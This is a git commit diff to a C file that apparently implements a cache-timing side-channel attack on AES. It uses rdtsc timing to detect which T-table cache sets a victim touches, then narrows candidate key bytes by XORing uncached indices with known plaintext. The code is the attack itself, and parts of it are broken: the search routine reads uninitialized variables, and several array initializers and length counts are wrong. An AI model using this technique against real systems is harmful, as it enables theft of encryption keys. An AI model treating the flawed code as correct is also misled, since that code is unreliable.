b1d4e9b4d14c57fde9eded65fa9a861d9dfabbd2
vartika123 <vartika1004@yahoo.com>
2014-04-06 13:18:24 +0000

    Retrieval steps

--- check-new.c
+++ check-new.c
@@ -12,130 +12,148 @@ static __inline__ unsigned long long rdtsc(void)
      return x;
 }
 
-//char T[4][8]="4210944","4212992","4215040","4217088";
+char T[4][8]={"4210944","4212992","4215040","4217088"};
+int plaintext[4]={0x28,0xFF,0x10,0x02};
+int cachedset[4][4]={{264,268,286,268},{292,306,297,323},{342,325,325,338},{362,355,358,375}};
+int uncachedIndices[4][256]={-1};
+int cyc[4][4]={0};
+int rejectedKeyBits[4][256]={-1};
+int rejectedKeyBitsLength[4]={-1};
+int possibleKeySet[16][256]={-1};
 
-/*unsigned int T1=0X404900;
-unsigned int T2=0X405100;
-unsigned int T3=0x405900;
-*/
-int main(int argc, char **argv)
 
+void attack()
 {
+        int result;
+char buff[10];
+int set[4][256],i,j,k=0;
+//4 look up tables
+for(i=0;i<4;i++)
+{
+k=0;
+for(j=0;j<256;j++)
+{
+sprintf(buff,"%x",(atoi(T[i])+j*4));
+set[i][j]=conversion(buff);
+result = setSearch(i,set[i][j]);
+if(!result)
+{
+        uncachedIndices[i][k]=j;
+        rejectedKeyBits[i][k]=uncachedIndices[i][k]^plaintext[i];
+        k++;
+}
+}
+rejectedKeyBitsLength[i]=k-1;
+}
+for(i=0;i<4;i++)
+{
+for(j=0;j<rejectedKeyBitsLength[i];j++)
+{
+        result=rejectedKeyBits[i][j];
+        possibleKeySet[i][result]=-1;
+}
+}
+}
 
-
-FILE *fp=fopen(argv[1],"w+");
+int main(int argc, char **argv)
+{
+	FILE *fp=fopen(argv[1],"w+");
         char a[4194305];
 	char buff[100];
-        int i,j,k,count,l,increment=0,h=0;
+        int i,j,k,m,n,count,l,increment=0,h=0;
         double start,end;
-	long flag=0;
+	int flag=0;
+
+//Generate all possible key values
+	for(i=0;i<16;i++)
+	{
+		for(j=0;j<256;j++)
+		{
+		possibleKeySet[i][j]=j;
+		}
+	}
+
 
         //create and fill array
 
         for(i=0;i<4194305;i++)
                 a[i]='a';
 
-while(1)
-{ flag=0;
-for(l=0;l<4096;l++)
-{       i=l*64;
-//      start=omp_get_wtime();
-        //to cover all 8 lines of set1
-unsigned long long cycles = rdtsc();
-        for(j=0;j<16;j++)
+	while(1)
+	{
+		for(m=0;m<4;m++)
+			for(n=0;n<4;n++)
+				cyc[m][n]=0;
 
-        {       count=0;
-
+		for(l=0;l<4096;l++)
+		{ 
+		      i=l*64;
+        	//to cover all 8 lines of set1
+			unsigned long long cycles = rdtsc();
+	        	for(j=0;j<16;j++)
+		        {  
+			     count=0;
                 //read cache line
-		//unsigned long long cycles = rdtsc();
-                while(count<64)
+	             		while(count<64)
+          		      	{
+                        		k=a[i];
+	                        //to skip remaining sets
+		                        count++;
+                		        i++;
+               			 }
 
-                {
-                        k=a[i];
-                        //to skip remaining sets
-                        count++;
-                        i++;
-
-                }
-		//cycles = rdtsc() - cycles;
 	
-                increment=4095*64;
-                i=i+increment;
-	//	if(l==292)  
-	//		fprintf(fp,"%ld\t",cycles);
+		                increment=4095*64;
+               			 i=i+increment;
+      			}	
+	 		cycles = rdtsc() - cycles;
+ 	
+			if(cycles>8000)
+			{
+			//	printf("cycle greater than 8000= %d\t",l);
+				for(m=0;m<4;m++)
+				{
+					for(n=0;n<4;n++)
+					{
+						if(l==cachedset[m][n])
+							cyc[m][n]=1;
 
-      }
- cycles = rdtsc() - cycles;
+					}
+				}
+			}		
+		}
 
-if(cycles>8000)
-{/*
-switch(l)
-{
-	case 264:flag | 1;
-		 break;
-	case 268:flag | (1<<1);
-		 break;
-	case 286: flag | (1<<2);
-		 break;
-	case 292: flag | (1<<3);
-		 break;
-	case 306: flag |(1<<4);
-		 break;
-	case 297: flag |(1<<5);
-		 break;
-	case 323:flag |(1<<6);
-		 break;
-	case 342:flag |(1<<7);
-		 break;
-	case 325:flag |(1<<8);
-		 break;
-	case 338:flag |(1<<9);
-		 break;
-	case 362:flag |(1<<10);
-		 break;
-	case 355:flag |(1<<11);
-		 break;
-	case 358:flag |(1<<12);
-		break;
-	case 375: flag |(1<<13);
-		break;
-	default: break;
-}
- */
-if(l==264||l==268||l==286||l==292||l==306||l==297||l==323||l==342||l==325||l==338||l==362||l==355||l==358||l==375)
-{
-fprintf(fp,"%d\t",l);
-time_t now=time(NULL);
+		for(m=0;m<4;m++)
+		{
+			for(n=0;n<4;n++)
+			{
+				if(cyc[m][n]==1)
+					flag=1;
+				else 
+				{
+					flag=0;
+					break;
+				}
+			}
+			if(flag==0)
+			break;
+		}
 
-strftime(buff,100,"%H:%M:%S.000",localtime(&now));
-//printf("%s\n",buff);
-fprintf(fp,"%d %s\t",l,buff);
-}
+		if(flag)
+		{
+			time_t now=time(NULL);
+		        strftime(buff,100,"%H:%M:%S.000",localtime(&now));
+			printf("\nAES ATTACK at %s\n",buff);
+			flag=0;
+			break;
+
+		}
+
+	}
+	attack();
 }
 
-if(flag == 16383)
-{
-fprintf(fp,"AES attck");
-time_t now=time(NULL);
-
-strftime(buff,100,"%H:%M:%S.000",localtime(&now));
-printf("%s\n",buff);
-
-//attack();
-}
-
-}
-/*time_t now=time(NULL);
-
-strftime(buff,100,"%H:%M:%S.000",localtime(&now));
-printf("%s\n",buff);
-*/
-//printf("hey");
-fprintf(fp,"\n---------------------------\n");
-}
-}
-
-/*int conversion(char hexaDecimal[6])
+int conversion(char hexaDecimal[7])
 {
 char binaryNumber[24],modifiedBinary[12],ch;
     int i,j,blen,len,temp;
@@ -169,30 +187,34 @@ char binaryNumber[24],modifiedBinary[12],ch;
      for(i=0;i<12;i++)
      {
  		rem = num%10;
- num = num/10;
- set = set + rem * pow(2,power);
- power++;
-}
+		 num = num/10;
+ 		set = set + rem * pow(2,power);
+		 power++;
+	}
 return set;
  }
 
-
-attack()
+int setSearch(int tableNumber, int setNumber)
 {
-	char buff[10];
-	int set[256],i,j;
-	//4 look up tables
-	for(i=0;i<4;i++)
-	{
-		for(j=0;j<256;j++)
-		{
-			sprintf(buff,"%x",(atoi(T[i])+j*4));
-			set[i][j]=conversion(buff);
-
-
-			unaccessedset[i][j]
-		}
-	}
+   int c, first, last, middle, n, search, array[100];
+ 
+   first = 0;
+   last = n - 1;
+   middle = (first+last)/2;
+ 
+   while( first <= last )
+   {
+      if ( cachedset[tableNumber][middle] < search )
+         first = middle + 1;    
+      else if ( cachedset[tableNumber][middle] == search ) 
+      {
+         return 1;
+      }
+      else
+         last = middle - 1;
+ 
+      middle = (first + last)/2;
+   }
+   return 0;   
 }
-			
-*/
+
